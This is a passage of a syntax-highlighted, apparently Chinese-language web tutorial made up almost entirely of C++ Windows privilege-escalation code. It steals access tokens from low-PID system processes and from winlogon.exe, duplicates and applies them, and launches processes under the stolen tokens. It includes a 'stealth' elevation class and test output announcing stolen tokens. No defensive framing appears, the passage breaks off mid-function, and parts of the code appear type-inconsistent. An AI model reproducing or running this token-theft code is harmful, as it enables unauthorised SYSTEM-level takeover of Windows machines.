+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">_stricmp</span><span style="color:#E1E4E8">(pe32.szExeFile, processName) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">                    // 找到目标进程，尝试窃取令牌</span></span>
+<span class="line"><span style="color:#F97583">                    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(pe32.th32ProcessID)) {</span></span>
+<span class="line"><span style="color:#B392F0">                        CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">                        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                    }</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            } </span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32Next</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe32));</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 从系统进程中窃取令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> StealTokenFromSystemProcess</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD processIds[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD bytesReturned;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 枚举所有进程</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">EnumProcesses</span><span style="color:#E1E4E8">(processIds, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(processIds), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bytesReturned)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD processCount </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> bytesReturned </span><span style="color:#F97583">/</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(DWORD);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 查找系统进程（PID通常很小）</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (DWORD i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8"> processCount; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (processIds[i] </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 1000</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> processIds[i] </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">                // 尝试从该进程窃取令牌</span></span>
+<span class="line"><span style="color:#F97583">                if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(processIds[i])) {</span></span>
+<span class="line"><span style="color:#B392F0">                    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Token stolen from system process PID: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, processIds[i]);</span></span>
+<span class="line"><span style="color:#F97583">                    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 创建具有提升权限的进程</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> CreateElevatedProcess</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> applicationName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_ALL_ACCESS, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建主令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hNewToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">DuplicateTokenEx</span><span style="color:#E1E4E8">(hToken, TOKEN_ALL_ACCESS, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                             SecurityImpersonation, TokenPrimary, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hNewToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 设置令牌为提升状态</span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_ELEVATION_TYPE elevationType </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> TokenElevationTypeFull;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">SetTokenInformation</span><span style="color:#E1E4E8">(hNewToken, TokenElevationType, </span></span>
+<span class="line"><span style="color:#F97583">                                &#x26;</span><span style="color:#E1E4E8">elevationType, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(elevationType))) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hNewToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 创建进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        STARTUPINFOA si </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> { </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(STARTUPINFOA) };</span></span>
+<span class="line"><span style="color:#E1E4E8">        PROCESS_INFORMATION pi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BOOL result </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateProcessAsUserA</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#E1E4E8">            hNewToken,</span></span>
+<span class="line"><span style="color:#E1E4E8">            applicationName,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">            FALSE,</span></span>
+<span class="line"><span style="color:#79B8FF">            0</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#79B8FF">            NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#F97583">            &#x26;</span><span style="color:#E1E4E8">si,</span></span>
+<span class="line"><span style="color:#F97583">            &#x26;</span><span style="color:#E1E4E8">pi</span></span>
+<span class="line"><span style="color:#E1E4E8">        );</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (result) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(pi.hThread);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(pi.hProcess);</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Elevated process created: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, applicationName);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hNewToken);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> (result </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> FALSE);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取当前进程完整性级别</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> DWORD</span><span style="color:#B392F0"> GetCurrentIntegrityLevel</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD tokenInfoLength </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">        GetTokenInformation</span><span style="color:#E1E4E8">(hToken, TokenIntegrityLevel, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        PTOKEN_MANDATORY_LABEL tokenLabel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PTOKEN_MANDATORY_LABEL)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(tokenInfoLength);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">tokenLabel) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">GetTokenInformation</span><span style="color:#E1E4E8">(hToken, TokenIntegrityLevel, tokenLabel, </span></span>
+<span class="line"><span style="color:#E1E4E8">                                tokenInfoLength, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">tokenInfoLength)) {</span></span>
+<span class="line"><span style="color:#B392F0">            free</span><span style="color:#E1E4E8">(tokenLabel);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD integrityLevel </span><span style="color:#F97583">=</span><span style="color:#F97583"> *</span><span style="color:#B392F0">GetSidSubAuthority</span><span style="color:#E1E4E8">(tokenLabel->Label.Sid, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        free</span><span style="color:#E1E4E8">(tokenLabel);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> integrityLevel;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 从指定进程复制令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> processId</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 打开目标进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hProcess </span><span style="color:#F97583">=</span><span style="color:#B392F0"> OpenProcess</span><span style="color:#E1E4E8">(PROCESS_QUERY_INFORMATION, FALSE, processId);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">hProcess) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 打开进程令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(hProcess, TOKEN_DUPLICATE </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> TOKEN_ASSIGN_PRIMARY </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 复制令牌</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hNewToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">DuplicateTokenEx</span><span style="color:#E1E4E8">(hToken, TOKEN_ALL_ACCESS, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                             SecurityImpersonation, TokenPrimary, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hNewToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 应用令牌到当前线程</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">SetThreadToken</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">, hNewToken)) {</span></span>
+<span class="line"><span style="color:#B392F0">            printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Token duplicated and applied from PID: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, processId);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hNewToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">            CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hNewToken);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hToken);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hProcess);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试高级令牌提权</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestAdvancedTokenPrivilege</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Advanced Token Privilege Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取当前完整性级别</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD integrityLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> AdvancedTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GetCurrentIntegrityLevel</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Current integrity level: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, integrityLevel);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 尝试从系统进程窃取令牌</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Attempting to steal token from system process...</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">AdvancedTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">StealTokenFromSystemProcess</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Token successfully stolen</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 再次检查完整性级别</span></span>
+<span class="line"><span style="color:#E1E4E8">        integrityLevel </span><span style="color:#F97583">=</span><span style="color:#B392F0"> AdvancedTokenPrivilege</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">GetCurrentIntegrityLevel</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] New integrity level: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, integrityLevel);</span></span>
+<span class="line"><span style="color:#E1E4E8">    } </span><span style="color:#F97583">else</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-] Failed to steal token</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-10">3. 隐蔽令牌提权实现</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// stealth_token_privilege.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 隐蔽令牌提权实现</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;tlhelp32.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 隐蔽令牌提权类</span></span>
+<span class="line"><span style="color:#F97583">class</span><span style="color:#B392F0"> StealthTokenPrivilege</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#E1E4E8"> m_isElevated;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">public:</span></span>
+<span class="line"><span style="color:#6A737D">    // 隐蔽提权初始化</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> InitializeStealthElevation</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 检查是否已经在提升状态下</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">IsProcessElevated</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            m_isElevated </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#6A737D">        // 尝试隐蔽提权</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> PerformStealthElevation</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查是否已提权</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> IsElevated</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> m_isElevated;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 隐蔽启用特权</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> StealthEnablePrivilege</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> privilegeName</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 使用较低权限尝试启用</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> EnablePrivilege</span><span style="color:#E1E4E8">(privilegeName, </span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 获取系统权限令牌</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#B392F0"> HANDLE</span><span style="color:#B392F0"> GetSystemToken</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#6A737D">        // 查找winlogon.exe进程</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD winlogonPid </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetProcessIdByName</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"winlogon.exe"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (winlogonPid </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> DuplicateTokenFromProcess</span><span style="color:#E1E4E8">(winlogonPid);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">private:</span></span>
+<span class="line"><span style="color:#6A737D">    // 检查进程是否已提升</span></span>
+<span class="line"><span style="color:#F97583">    static</span><span style="color:#F97583"> bool</span><span style="color:#B392F0"> IsProcessElevated</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hToken;</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">OpenProcessToken</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">GetCurrentProcess</span><span style="color:#E1E4E8">(), TOKEN_QUERY, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">hToken)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        TOKEN_ELEVATION elevation;</span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD returnLength;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">GetTokenInformation</span><span style="color:#E1E4E8">(hToken, TokenElevation, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">elevation, </span></span>
